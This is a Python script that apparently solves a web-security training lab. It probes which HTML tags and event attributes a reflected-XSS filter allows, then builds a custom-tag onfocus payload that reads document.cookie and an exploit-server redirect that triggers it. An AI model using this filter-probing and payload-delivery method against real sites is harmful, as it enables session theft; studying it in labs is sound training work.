import http.client
import random
import ssl
import string
import urllib
import urllib.parse

LAB_ID = "???"


def GET_(
        search: str,
) -> http.client.HTTPResponse:
    method, path = 'GET', '/'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    query_params = [
        ('search', search),
    ]
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'priority': 'u=0, i',
        'te': 'trailers',
    }
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, f"{path}?{urllib.parse.urlencode(query_params)}", '', headers)
    return connection.getresponse()


def random_str() -> str:
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(6))


tags = [
    "<!--...-->",
    "<!DOCTYPE>",
    "<a>",
    "<abbr>",
    "<acronym>",
    "<address>",
    "<applet>",
    "<area>",
    "<article>",
    "<aside>",
    "<audio>",
    "<b>",
    "<base>",
    "<basefont>",
    "<bdi>",
    "<bdo>",
    "<big>",
    "<blockquote>",
    "<body>",
    "<br>",
    "<button>",
    "<canvas>",
    "<caption>",
    "<center>",
    "<cite>",
    "<code>",
    "<col>",
    "<colgroup>",
    "<data>",
    "<datalist>",
    "<dd>",
    "<del>",
    "<details>",
    "<dfn>",
    "<dialog>",
    "<dir>",
    "<div>",
    "<dl>",
    "<dt>",
    "<em>",
    "<embed>",
    "<fieldset>",
    "<figcaption>",
    "<figure>",
    "<font>",
    "<footer>",
    "<form>",
    "<frame>",
    "<frameset>",
    "<h1> to <h6>",
    "<head>",
    "<header>",
    "<hgroup>",
    "<hr>",
    "<html>",
    "<i>",
    "<iframe>",
    "<img>",
    "<input>",
    "<ins>",
    "<kbd>",
    "<label>",
    "<legend>",
    "<li>",
    "<link>",
    "<main>",
    "<map>",
    "<mark>",
    "<menu>",
    "<meta>",
    "<meter>",
    "<nav>",
    "<noframes>",
    "<noscript>",
    "<object>",
    "<ol>",
    "<optgroup>",
    "<option>",
    "<output>",
    "<p>",
    "<param>",
    "<picture>",
    "<pre>",
    "<progress>",
    "<q>",
    "<rp>",
    "<rt>",
    "<ruby>",
    "<s>",
    "<samp>",
    "<script>",
    "<search>",
    "<section>",
    "<select>",
    "<small>",
    "<source>",
    "<span>",
    "<strike>",
    "<strong>",
    "<style>",
    "<sub>",
    "<summary>",
    "<sup>",
    "<svg>",
    "<table>",
    "<tbody>",
    "<td>",
    "<template>",
    "<textarea>",
    "<tfoot>",
    "<th>",
    "<thead>",
    "<time>",
    "<title>",
    "<tr>",
    "<track>",
    "<tt>",
    "<u>",
    "<ul>",
    "<var>",
    "<video>",
    "<wbr>",
]
print("allowed tags:")
for tag in tags:
    response = GET_(search=tag)
    if response.status == 400 and response.read().decode() == "\"Tag is not allowed\"":
        continue
    print(tag)
tag = "customtag"
print(f"<{tag}> tag is allowed")
print()

event = "onfocus"
response = GET_(search=f"<{tag} {event}=1>")
if response.status == 400 and response.read().decode() == "\"Attribute is not allowed\"":
    print(f"{event} is not allowed")
    exit(1)
print(f"{event} is allowed")
print()

id = random_str()
search = f"""<{tag} {event}=alert(document.cookie) id={id} tabindex=1>"""
print("Exploit:")
print(f"""
HTTP/1.1 200
Content-Type: text/html; charset=utf-8
""")
print("Body:")
print(f"""
<script>
document.location="https://{LAB_ID}.web-security-academy.net?search={urllib.parse.quote_plus(search)}#{id}";
</script>
""")
